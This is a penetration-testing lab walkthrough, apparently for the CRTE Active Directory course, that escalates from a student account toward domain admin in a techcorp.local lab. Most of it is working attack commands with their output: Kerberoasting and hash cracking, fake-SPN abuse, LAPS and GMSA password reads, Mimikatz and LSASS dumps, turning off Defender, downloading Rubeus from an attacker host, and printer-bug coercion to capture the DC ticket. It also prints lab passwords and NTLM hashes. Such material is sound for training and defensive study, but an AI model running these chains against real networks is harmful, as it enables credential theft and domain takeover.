# Methodology
- Our goal is to **find as many misconfigurations** as possible in the domain and reach DA privileges.
- We will try to move laterally on the domain by compromising and impersonating domain accounts. For each account compromised, we will perform a thorough enumeration of their **Rights** (what those accounts can access), their **Privileges** (what privileges those accounts have in the resources they can access) and their **Permissions** (what actions those accounts can perform in other objects of the domain).
- We will do that by leveraging the information we have gathered during the enumeration phase, as well as by gathering additional information along the way. BloodHound can be very helpful to visualize much of the gathered intel.
- In each machine we compromise we will attempt to steal credentials (password/hashes) and tokens (tickets/certificates).
- For each user account we compromise we will check possible access to interesting file shares in the domain, since many times those shares host interesting files.
- For each attack we will use various tools.
# 1. Kerberoasting
- Kerberoasting should be one of the first things we should do when we have a low-privileged access on the domain.
- In most situations, services accounts are machine accounts, which have very complex, long, and random passwords.
- If a user account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline.
- Many times those accounts are high-privileged.
### 1.1.1 Rubeus
```powershell
PS C:\Auditor> .\Rubeus.exe kerberoast /domain:us.techcorp.local /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : us.techcorp.local
[*] Searching path 'LDAP://US-DC.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


[*] SamAccountName         : serviceaccount
[*] DistinguishedName      : CN=serviceaccount,CN=Users,DC=us,DC=techcorp,DC=local
[*] ServicePrincipalName   : USSvc/serviceaccount
[*] PwdLastSet             : 7/16/2019 12:03:27 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*serviceaccount$us.techcorp.local$USSvc/serviceaccount@us.techcorp.local*$3607...


[*] SamAccountName         : appsvc
[*] DistinguishedName      : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
[*] ServicePrincipalName   : appsvc/us-jump.us.techcorp.local
[*] PwdLastSet             : 1/8/2021 5:50:35 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*appsvc$us.techcorp.local$appsvc/us-jump.us.techcorp.local@us.techcorp.local*$6B4B9C...
```
### 1.1.2 Invoke-Kerberoast.ps1
```powershell
PS C:\Auditor> Invoke-Kerberoast -Domain us.techcorp.local


TicketByteHexStream  :
Hash                 : $krb5tgs$USSvc/serviceaccount:360757D9275627E1378D988C5FD9965B$4E53786F5...
SamAccountName       : serviceaccount
DistinguishedName    : CN=serviceaccount,CN=Users,DC=us,DC=techcorp,DC=local
ServicePrincipalName : USSvc/serviceaccount

TicketByteHexStream  :
Hash                 : $krb5tgs$appsvc/us-jump.us.techcorp.local:6B4B9C309A3C0DE8E7FE1CDA0FC912AE$30FBF7...
SamAccountName       : appsvc
DistinguishedName    : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
ServicePrincipalName : appsvc/us-jump.us.techcorp.local
```
### 1.2 Hashcat
- We can now copy the _Hash_ values, paste them in a file on our machine and attempt to crack them.
```zsh
â”Œâ”€â”€(rootðŸ”±KaliVM)-[/home/pri3st/Desktop/Training/CRTE]
â””â”€# hashcat -O -a 0 -m 13100 tickets.tgs /usr/share/wordlists/rockyou.txt

<snip>

$krb5tgs$23$*serviceaccount$us.techcorp.local$USSvc/serviceaccount@us.techcorp.local*$888...:Password123

<snip>
```
- We now have a valid set of credentials, **serviceaccount:Password123**.
# 2. ASREPRoasting
- Since some applications don't support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline.
### 2.1 Rubeus
```powershell
PS C:\Auditor> .\Rubeus.exe asreproast /domain:us.techcorp.local /dc:us-dc.us.techcorp.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: AS-REP roasting

[*] Target Domain          : us.techcorp.local
[*] Target DC              : us-dc.us.techcorp.local

[*] Searching path 'LDAP://us-dc.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[X] No results returned by LDAP!
[X] Error during executing the LDAP query.
```
# 3. Extracting Credentials and Tokens from `STUDENT57`
- Using `Mimikatz`, `Rubeus` and `CertifyKit` does not reveal anything interesting.
# 4. Rights, Privileges and Permissions of `us\studentuser59`
## 4.1 Access Rights
```powershell
PS C:\Auditor> ipmo .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Auditor> Find-PSRemotingLocalAdminAccess
student57
```
- `us\studentuser57` does not have further access rights to other domain computers.

```powershell
PS C:\Auditor> .\SharpShares.exe /threads:50 /ldap:all /filter:SYSVOL,NETLOGON,IPC$,PRINT$ /verbose
[+] Parsed Arguments:
        filter: none
        filter: SYSVOL,NETLOGON,IPC$,PRINT$
        dc:
        domain:
        ldap: all
        ou:
        stealth: False
        threads: 50
        verbose: True
        outfile: none

<snip>
```
- `us\studentuser57` does not have further access rights to any interesting file shares.
## 4.2 Account Privileges
- This account has administrative privileges on `STUDENT57`.
## 4.3 Account Permissions
- Using **BloodHound** we can see the following:
![[studentuser_nested_membership.png]]
![[studentuser57_perms1.png]]
![[studentuser57_perms2.png]]
- We can see that:
	- `us\studentuser57`, as a member of the `StudentUsers` Domain Group, has `ReadLAPSPassword` permissions to `US-MAILMGMT`.
	- `us\studentuser57`, as a member of the `StudentUsers` Domain Group, is also a member of `MaintenanceUsers` and `Managers` due to nested membership.
		- Members of the `Managers` Domain Group have `GenericAll` and `AddMember` permissions over the `MachineAdmins` Domain Group, which means that those accounts can add themselves to it.
		- The `MachineAdmins` Domain Group has a self-explaining description `Group to manage machines of the Mgmt OU`.
		- `US-MGMT` is a member of the `Mgmt` Domain OU.
		- This means that `us\studentuser57` can manage `US-MGMT` after the account has added itself in the `MachineAdmins` Domain Group.
	- `us\studentuser57`, as a member of the `StudentUsers` Domain Group, and this Group has `GenericAll` privileges on `SupportXUser` accounts.
		- This means that members of this Group have full rights to the objects and can perform various actions on them, such as reset their passwords.
		- Since resetting passwords is a disruptive action that can trigger alerts, we can perform a Targeted Kerberoasting Attack on the target accounts. We will assign a SPN to them and then we will request a TGS for them in an attempt to crack the ticket and retrieve the account's plaintext password, if it is weak enough.
### 4.2.1 Abusing the `GenericAll` permission on `SupportXUser` accounts
- We will target our designated user, `us\Support57User`. First we need to make sure that the target user does not already have a SPN.
```powershell
PS C:\Auditor> Get-DomainUser Support57User | Select serviceprincipalname

serviceprincipalname
--------------------
```
- We will create a fake SPN and assign it to the user account. We will also check if it was properly assigned.
```powershell
PS C:\Auditor> Set-DomainObject -Identity Support57User -Set @{serviceprincipalname='CIFS/US-WRKST1.US.TECHCORP.LOCAL'}
```
- We can check if the SPN was properly assigned to our target account.
```powershell
PS C:\Auditor> Get-DomainUser Support57User | Select serviceprincipalname

serviceprincipalname
--------------------
CIFS/US-WRKST1.US.TECHCORP.LOCAL
```
- We will request a TGS from the fake SPN of the target account, since this ticket will contain the encrypted password of the target user's password.
```powershell
PS C:\Auditor> .\Rubeus.exe kerberoast /user:Support57User /domain:us.techcorp.local /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : Support57User
[*] Target Domain          : us.techcorp.local
[*] Searching path 'LDAP://US-DC.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=Support57User)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : Support57user
[*] DistinguishedName      : CN=Support57User,CN=Users,DC=us,DC=techcorp,DC=local
[*] ServicePrincipalName   : CIFS/US-WRKST1.US.TECHCORP.LOCAL
[*] PwdLastSet             : 12/27/2022 2:56:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*Support57user$us.techcorp.local$CIFS/US-WRKST1.US.TECHCORP.LOCAL@us.techcorp.local*$B85...
```
- We will now attempt to crack the TGS and retrieve the target user's plaintext password.
```zsh
â”Œâ”€â”€(rootðŸ”±KaliVM)-[/home/pri3st/Desktop/Training/CRTE]
â””â”€# hashcat -O -a 0 -m 13100 targeted_kerberoast.tgs 10k-worst-pass.txt

<snip>

$krb5tgs$23$*Support57user$us.techcorp.local$CIFS/US-WRKST1.US.TECHCORP.LOCAL@us.techcorp.local*$b857d31d8a0bf...:Desk@123

<snip>
```
- We now have a valid set of credentials, **Support57User:Desk@123**.
- We will now clear the SPN attribute from the target account to cover our tracks and revert the account in its previous state.
```powershell
PS C:\Auditor> $User | Select serviceprincipalname

serviceprincipalname
--------------------
CIFS/US-WRKST1.US.TECHCORP.LOCAL


PS C:\Auditor> Set-DomainObject -Identity Support57User -Clear serviceprincipalname
```
- Let's make sure that we have successfully cleared the SPN from the target user.
```powershell
PS C:\Auditor> Get-DomainUser Support57User | Select serviceprincipalname

serviceprincipalname
--------------------
```
### 4.2.2 Abusing the `ReadLAPSPassword` permission on `US-MAILMGMT`.
- We can easily read the LAPS password using **PowerView**.
```powershell
PS C:\Auditor> Get-DomainComputer "US-MAILMGMT" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

ms-mcs-admpwd  ms-mcs-admpwdexpirationtime cn
-------------  --------------------------- --
]T&+4]6/h4TaIB          133477776162639191 US-MAILMGMT
```
### 4.2.3 Abusing the `AddMember` permission on `MachineAdmins` Domain Group due to Nested Group Membership.
- We can add ourselves to the `MachineAdmins` domain group using **PowerView**.
```powershell
PS C:\Auditor> Add-DomainGroupMember -Identity 'MachineAdmins' -Members us\studentuser57
```
- We can confirm our membership in the target domain group.
```powershell
PS C:\Auditor> Get-DomainGroupMember -Identity MachineAdmins


GroupDomain             : us.techcorp.local
GroupName               : machineadmins
GroupDistinguishedName  : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
MemberDomain            : us.techcorp.local
MemberName              : studentuser57
MemberDistinguishedName : CN=studentuser57,CN=Users,DC=us,DC=techcorp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-210670787-2521448726-163245708-16107
```
- For the changes to take effect, we need to log out and log in again to `STUDENT57`, since we need to request a new TGT that will contain our new domain group membership. Alternatively, we can purge our Kerberos tickets and request a new one using **Rubeus**.
```powershell
PS C:\Auditor> .\Rubeus.exe purge

<snip>

PS C:\Auditor> .\Rubeus.exe asktgt /user:studentuser57 /password:454RW7yRhbanBaFC /domain:us.techcorp.local /ptt

<snip>
```
- We can  now check if this new domain group membership grants us any new access rights to domain computers.
```powershell
PS C:\Auditor> Find-PSRemotingLocalAdminAccess
student57
US-Mgmt
```
- As members of the `MachineAdmins` domain group we now have access to `US-MGMT`.
# 5. Extracting Credentials and Tokens from `US-MGMT`
- We can remotely access `US-MGMT` due to `MachineAdmins` domain group membership, which means that we can steal credentials and tokens. We will use **Mimikatz**, **Rubeus**and **certutil**, after we temporarily disable AV.
```powershell
PS C:\Windows\Tasks> .\mimikatz.exe

<snip>

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate

<snip>

mimikatz # sekurlsa::logonpasswords

<snip>

Authentication Id : 0 ; 1487267 (00000000:0016b1a3)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/27/2022 2:59:24 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : US-MGMT$
         * Domain   : US
         * NTLM     : fae951131d684b3318f524c535d36fb2
         * SHA1     : 5a8d545eba116bcd5c01d644a7fb66c87d595342
        tspkg :
        wdigest :
         * Username : US-MGMT$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
        ssp :
        credman :

Authentication Id : 0 ; 1566171 (00000000:0017e5db)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/27/2022 3:04:05 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1115
        msv :
         [00000003] Primary
         * Username : mgmtadmin
         * Domain   : US
         * NTLM     : e53153fc2dc8d4c5a5839e46220717e5
         * SHA1     : b263624c0c88da5a05c2ab128f9867ee12148a9a
         * DPAPI    : ae80e77b79bc6e15d004eed1e679a7be
        tspkg :
        wdigest :
         * Username : mgmtadmin
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : mgmtadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

<snip>
```
# 6. Extracting Credentials and Tokens from `US-MAILGMT`
- We have retrieved the LAPS password for `US-MAILMGMT` which means that we can remotely access the server as the local administrator and steal credentials and tokens, using **Mimikatz**, **Rubeus**and **certutil**, after we temporarily disable AV.
```powershell
PS C:\Auditor> winrs -r:us-mailmgmt.us.techcorp.local -u:.\Administrator powershell
Enter the password for '.\Administrator' to connect to 'us-mailmgmt.us.techcorp.local':
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> .\mimikatz.exe
.\mimikatz.exe

<snip>

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 117259 (00000000:0001ca0b)
Session           : Service from 0
User Name         : provisioningsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 11/22/2023 8:00:13 PM
SID               : S-1-5-21-210670787-2521448726-163245708-8602
        msv :
         [00000003] Primary
         * Username : provisioningsvc
         * Domain   : US
         * NTLM     : 44dea6608c25a85d578d0c2b6f8355c4
         * SHA1     : cb6a8c895958c1958de9f2cf5aae0cddd1962a56
         * DPAPI    : d0261701e179de1ae56c508312f42aaf
        tspkg :
        wdigest :
         * Username : provisioningsvc
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : provisioningsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 29609 (00000000:000073a9)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/22/2023 8:00:09 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : US-MAILMGMT$
         * Domain   : US
         * NTLM     : 6e1c353761fff751539e175a8393a941
         * SHA1     : 0e4cb5977d5a8451f8faf85649764adba667de70
        tspkg :
        wdigest :
         * Username : US-MAILMGMT$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
        ssp :
        credman :

<snip>
```
# 7. Rights, Privileges and Permissions of `us\provisioningsvc`
## 7.1 Access Rights
- No interesting access rights exist for this domain account.
## 7.2 Account Privileges
- This account does not have any special privileges.
## 7.3 Account Permissions
- Using **BloodHound** we can see the following:
![[provisioningsvc_perms.png]]
`us\provisioningsvc` has `ReadGMSAPassword` over the `us\jumpone$` account which means that `us\provisioningsvc` can retrieve the password for the target GMSA.
- Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).
- First we will need to impersonate `us\provisioningsvc`. Since we have the account's NTLM hash we can request a TGT for it. We will do it in a sacrificial PowerShell session.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:provisioningsvc /rc4:44dea6608c25a85d578d0c2b6f8355c4 /domain:us.techcorp.local /nowrap /ptt

<snip>
```
- We can abuse this permission with `GMSAPasswordReader.exe`. 
```powershell
PS C:\Auditor> .\GMSAPasswordReader.exe --domainname us.techcorp.local --accountname jumpone$
Calculating hashes for Old Value
[*] Input username             : jumpone$
[*] Input domain               : US.TECHCORP.LOCAL
[*] Salt                       : US.TECHCORP.LOCALjumpone$
[*]       rc4_hmac             : E6DBB7105F6111E9EE0DFEE682A1690B
[*]       aes128_cts_hmac_sha1 : 27140C141BF9D6F16C45FE85F1F36B2F
[*]       aes256_cts_hmac_sha1 : 01DC5247CE125F564602E54FBC08887D7DAEDB0867EC764D4668BB9FB5722ADC
[*]       des_cbc_md5          : D554E39DB99D70B6

Calculating hashes for Current Value
[*] Input username             : jumpone$
[*] Input domain               : US.TECHCORP.LOCAL
[*] Salt                       : US.TECHCORP.LOCALjumpone$
[*]       rc4_hmac             : 5FCF34DE780D3E51A0B7B3DC7C6C28E4
[*]       aes128_cts_hmac_sha1 : 8F384FA44EDCACD8847126C3910DD9A0
[*]       aes256_cts_hmac_sha1 : C7F3DB8D5E03CB25DA69CD11E2C749C19FC9033DBB55C37CCB8AF55CAFAACF3F
[*]       des_cbc_md5          : 7067A416EAEC7334
```
# 8. Rights, Privileges and Permissions of `us\jumpone$`
## 8.1 Access Rights
- Since we now have the hash for `us\jumpone$` account we can impersonate it by requesting a TGT, similarly as before, in a sacrificial session.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:jumpone$ /rc4:5FCF34DE780D3E51A0B7B3DC7C6C28E4 /domain:us.techcorp.local /nowrap /ptt

<snip>
```
- We can now check if we have remote access to domain computers.
```powershell
PS C:\Auditor> ipmo .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Auditor> Find-PSRemotingLocalAdminAccess
US-Jump
```
- As expected from the name of the GMSA, `us\jumpone$` can remotely access `US-JUMP`.
## 8.2 Account Privileges
- This account has administrative privileges on `US-JUMP`.
## 8.3 Account Permissions
- No interesting permissions have been discovered for this domain account.
# 9. Extracting Credentials and Tokens from `US-JUMP`
- By impersonating `us\jumpone$` we can remotely access the server with administrative privileges and steal credentials and tokens, using **Mimikatz**, **Rubeus**and **certutil**, after we temporarily disable AV.
```powershell
PS C:\Windows\Tasks> .\mimikatz.exe
.\mimikatz.exe
Program 'mimikatz.exe' failed to run: Your organization used Device Guard to block this app. Contact your support

<snip>
```
- It seems that **Device Guard** is blocking us from using our credential pillaging tools. Since we have administrative privileges on the compromised server we can dump LSASS using native Windows binaries and attempt to crack it on our own server. We can use **comsvcs.dll** and **rundll32.exe**.
```powershell
PS C:\Windows\Tasks> tasklist /FI "IMAGENAME eq lsass.exe"
tasklist /FI "IMAGENAME eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      696 Services                   0     21,400 K

PS C:\Windows\Tasks> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 696 C:\Windows\Tasks\lsass.dmp full
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 696 C:\Windows\Tasks\lsass.dmp full
PS C:\Windows\Tasks> dir
dir


    Directory: C:\Windows\Tasks


Mode                LastWriteTime         Length Name                                               
----                -------------         ------ ----                                               
-a----        12/2/2023   9:44 AM       47255290 lsass.dmp                                          
-a----        12/2/2023   8:56 AM        1250056 mimikatz.exe
```
- We can also search for certificates in the _Local Machine_ and _Current User_ Certificate Stores.
```powershell
PS C:\Windows\Tasks> certutil -store My
certutil -store My
My "Personal"
================ Certificate 0 ================
Serial Number: 770000002277618a0e7a1bce4f000000000022
Issuer: CN=TECHCORP-DC-CA, DC=techcorp, DC=local
 NotBefore: 6/1/2023 1:34 AM
 NotAfter: 5/31/2024 1:34 AM
Subject: E=pawadmin@techcorp.local, CN=pawadmin, CN=Users, DC=us, DC=techcorp, DC=local
Non-root Certificate
Template: 1.3.6.1.4.1.311.21.8.11428283.12600195.6637456.4695971.7627035.128.16055752.16575009, Users
Cert Hash(sha1): 725a67544603edee1d700acdce04c7b32b447be6
  Key Container = te-Users-58337848-55d1-4714-af0f-aa001efcbef8
  Unique container name: 97d732b54b2befc0dedb62890889e59f_47299789-e16f-492c-bb4d-2624d87a6ec3
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Encryption test passed
CertUtil: -store command completed successfully.

PS C:\Windows\Tasks> certutil -store -user My
certutil -store -user My
My "Personal"
CertUtil: -store command completed successfully.
```
- We have discovered a certificate for `us\pawadmin`. Let's export it.
```powershell
```powershell
PS C:\Windows\Tasks> certutil -p "certpass" -exportpfx 725a67544603edee1d700acdce04c7b32b447be6 C:\Windows\Tasks\pawadmin.pfx
certutil -p "certpass" -exportpfx 725a67544603edee1d700acdce04c7b32b447be6 C:\Windows\Tasks\pawadmin.pfx
MY "Personal"
================ Certificate 0 ================
Serial Number: 770000002277618a0e7a1bce4f000000000022
Issuer: CN=TECHCORP-DC-CA, DC=techcorp, DC=local
 NotBefore: 6/1/2023 1:34 AM
 NotAfter: 5/31/2024 1:34 AM
Subject: E=pawadmin@techcorp.local, CN=pawadmin, CN=Users, DC=us, DC=techcorp, DC=local
Non-root Certificate
Template: 1.3.6.1.4.1.311.21.8.11428283.12600195.6637456.4695971.7627035.128.16055752.16575009, Users
Cert Hash(sha1): 725a67544603edee1d700acdce04c7b32b447be6
  Key Container = te-Users-58337848-55d1-4714-af0f-aa001efcbef8
  Unique container name: 97d732b54b2befc0dedb62890889e59f_47299789-e16f-492c-bb4d-2624d87a6ec3
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Encryption test passed
CertUtil: -exportPFX command completed successfully.
```
- We can now exit our remote session and copy those files to our machine.
- We will use the LSASS dump to extract credentials.
```powershell
PS C:\Auditor> .\mimikatz.exe

<snip>

mimikatz # sekurlsa::minidump us-jump_lsass.dmp
Switch to MINIDUMP : 'us-jump_lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'us-jump_lsass.dmp' file for minidump...

<snip>

Authentication Id : 0 ; 19976486 (00000000:0130d126)
Session           : RemoteInteractive from 2
User Name         : pawadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/27/2022 3:03:46 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1138
        msv :
         [00000003] Primary
         * Username : pawadmin
         * Domain   : US
         * NTLM     : 36ea28bfa97a992b5e85bd22485e8d52
         * SHA1     : e143389dd70c1d719aa6b76518a00f3df98dbd0f
         * DPAPI    : 3b137c04aa513fdc4fd1fc50961ea71e
        tspkg :
        wdigest :
         * Username : pawadmin
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : pawadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

<snip>

Authentication Id : 0 ; 12246696 (00000000:00badea8)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/27/2022 2:59:28 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : US-JUMP$
         * Domain   : US
         * NTLM     : abff11a76a2fa6de107f0ea8251005c5
         * SHA1     : c130d6862fbe859a2285b9c17c54a9b8887291bd
        tspkg :
        wdigest :
         * Username : US-JUMP$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
        ssp :
        credman :

Authentication Id : 0 ; 81234 (00000000:00013d52)
Session           : Service from 0
User Name         : appsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/27/2022 2:38:23 AM
SID               : S-1-5-21-210670787-2521448726-163245708-4601
        msv :
         [00000003] Primary
         * Username : appsvc
         * Domain   : US
         * NTLM     : 1d49d390ac01d568f0ee9be82bb74d4c
         * SHA1     : c29d63c94f140118cee88165af764c67ae9c1e35
         * DPAPI    : 72631cfc6ac98f4b1de4e39c3f09d1f6
        tspkg :
        wdigest :
         * Username : appsvc
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : appsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : Us$rT0AccessDBwithImpersonation
        ssp :
        credman :

Authentication Id : 0 ; 26384696 (00000000:01929938)
Session           : Service from 0
User Name         : webmaster
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/27/2022 3:07:09 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1140
        msv :
         [00000003] Primary
         * Username : webmaster
         * Domain   : US
         * NTLM     : 23d6458d06b25e463b9666364fb0b29f
         * SHA1     : 550eec32c85e0ab442b036fadc5ada63b6c188d0
         * DPAPI    : 05848a77d9cb65860c7e4cb8f8503d2c
        tspkg :
        wdigest :
         * Username : webmaster
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : webmaster
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :
```
# 10. Rights, Privileges and Permissions of `us\webmaster`
## 10.1 Access Rights
- The name of the account implies that it has administrative privileges at `US-WEB`.
- Since we now have the credentials for `us\webmaster` account we can impersonate it by requesting a TGT, similarly as before, in a sacrificial session.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:webmaster /rc4:23d6458d06b25e463b9666364fb0b29f /domain:us.techcorp.local /ptt

<snip>
```
- We can now check if we have remote access to domain computers.
```powershell
PS C:\Auditor> ipmo .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Auditor> Find-PSRemotingLocalAdminAccess
US-Web
```
- As expected from the name of the GMSA, `us\webmaster` can remotely access `US-WEB`.
## 10.2 Account Privileges
- This account has administrative privileges on `US-WEB`.
## 10.3 Account Permissions
- No interesting permissions have been discovered for this domain account.
# 11. Extracting Credentials and Tokens from `US-WEB`
- We can now access `US-WEB` and attempt to steal credentials and tokens.
```powershell
PS C:\Auditor> winrs -r:us-web.us.techcorp.local powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\webmaster> .\mimikatz.exe
.\mimikatz.exe

<snip>

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate

<snip>

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 41921 (00000000:0000a3c1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/27/2022 2:39:04 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : US-WEB$
         * Domain   : US
         * NTLM     : 892ca1e8d4343c652646b59b51779929
         * SHA1     : 29d0e9804b830218aa1f7a1460874a29471cac60
        tspkg :
        wdigest :
         * Username : US-WEB$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
        ssp :
        credman :

<snip>
```
# 12. Permissions of `us-web$`
- From [[2. Lab Walkthrough/1st Forest (techcorp.local)/1. us.techcorp.local/1. Domain Enumeration]] we discovered that `US-WEB` has KUD privileges. We can abuse this to escalate our privileges to DA.
- We will transfer **Rubeus** to the server that is configured for KUD in order to monitor for tickets.
- After that, we will coerce the DC to authenticate to the server set for KUD in order to capture the machine account's ticket.
- On `US-WEB`:
```powershell
PS C:\Auditor> winrs -r:us-web.us.techcorp.local powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\webmaster> Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $true
cPS C:\Users\webmaster>cd C:\Windows\Tasks
cd C:\Windows\Tasks
PS C:\Windows\Tasks> wget http://192.168.100.57/Rubeus.exe -O Rubeus.exe
wget http://192.168.100.57/Rubeus.exe -O Rubeus.exe
PS C:\Windows\Tasks> .\Rubeus.exe monitor /interval:5 /targetuser:us-dc$
.\Rubeus.exe monitor /interval:5 /targetuser:us-dc$

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0

[*] Action: TGT Monitoring
[*] Target user     : us-dc$
[*] Monitoring every 5 seconds for new TGTs
```
- On our machine, we will use **MS-RPRN.exe** to trigger the MS-RPRN "printer bug" against the DC:
```powershell
PS C:\Auditor> .\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```
- On `US-WEB` we can see that we have captured the TGT of the `us\us-dc$` domain machine account:
```powershell
<snip>

doIFvDCCB...
```
